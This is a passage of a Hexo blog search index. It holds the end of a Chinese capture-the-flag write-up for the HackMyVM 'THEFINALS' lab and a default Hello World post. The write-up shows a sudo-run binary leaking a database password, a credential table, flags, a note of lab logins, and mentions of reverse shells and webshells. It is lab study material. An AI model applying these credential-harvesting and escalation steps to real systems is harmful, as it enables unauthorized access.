done<br></code></pre></td></tr></table></figure><p>之后再次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">sudo</span> /sbin/secret<br>root:p8RuoQGTtlKLAjuF1Tpy5wX<br></code></pre></td></tr></table></figure><p>终于拿到root密码了，ssh爽连……不了。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_6NaGPVcFYR-1748483267238-18.png"></p><p>原来是mysql的密码。</p><p>使用root账户就可以访问secret数据库了，从user表中拿到真的root密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Database changed<br>MariaDB [typecho_db]&gt; use secret;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [secret]&gt; show tables;<br>+------------------+<br>| Tables_in_secret |<br>+------------------+<br>| user             |<br>+------------------+<br>1 row in set (0.000 sec)<br><br>MariaDB [secret]&gt; select * from user;<br>+----+----------+-------------------------+<br>| id | username | password                |<br>+----+----------+-------------------------+<br>|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |<br>+----+----------+-------------------------+<br>1 row in set (0.000 sec)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_3mFOyhfZWa.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~# <span class="hljs-built_in">cat</span> root.flag <br> _____      __   __      ______<br>/\  __\    /\ <span class="hljs-string">&quot;-.\ \    /\  ___\</span><br><span class="hljs-string">\ \ \___   \ \ \-.  \   \ \___  \</span><br><span class="hljs-string"> \ \____\   \ \_\\&quot;</span>\_\   \ \_____\<br>  \/____/    \/_/ \/_/    \/_____/<br><br>flag&#123;8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff&#125;<br><br>thefinals:~# <span class="hljs-built_in">cat</span> note.txt <br>ssh://root@thefinals.hmv:BvIpFDyB4kNbkyqJGwMzLcK<br>ssh://staff@thefinals.hmv:qDCsBTj30cQyityMh3Rnyys<br>ssh://june@thefinals.hmv:aYTmcORsUrmwaKa7C2DBLCh<br>ssh://scotty@thefinals.hmv:uuUoqAETern4v5tW2iMFs47<br><br>mariadb://root@localhost:p8RuoQGTtlKLAjuF1Tpy5wX<br><br>mariadb://typecho_u@typecho_db@localhost:QLTkbviW71CSRZtGWIQdB6s<br><br>typecho://staff@thefinals.hmv:n3nPbqEOhs6eTcchyqXTXWi<br>typecho://june@thefinals.hmv:DihPQiQqNO75vv8zNBzLwUm<br><br>flag&#123;4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298&#125;<br>canyoureachthefinals -&gt; sha256<br><br>flag&#123;8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff&#125;<br>youfinallyreachedthefinals -&gt; sha256<br><br>THE FINALS is a great FPS game. A lot of inspiration comes from games. Try it on http://reachthefinals.com/<br><br></code></pre></td></tr></table></figure><p>这个靶机打的还是挺爽的，XSS漏洞一直不是很懂，通过这一次复习了一下。</p><p>嗯这边我不知道那个xss利用是不是只能反弹shell，当时我想写一句话马用蚁剑或者冰蝎连但是老连不上，但是上面博客里的exp是有用post实现rce的复现的，可能这个靶机是做了些限制还是什么。</p><p>之后我看了LingMJ大佬的wp，发现他就是用的蚁剑练的post马，只是连接密码不一样，所以应该不是靶机的问题，可能我这边写入shell的方式有点问题吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/21/hello-world/"/>
    <url>/2025/02/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
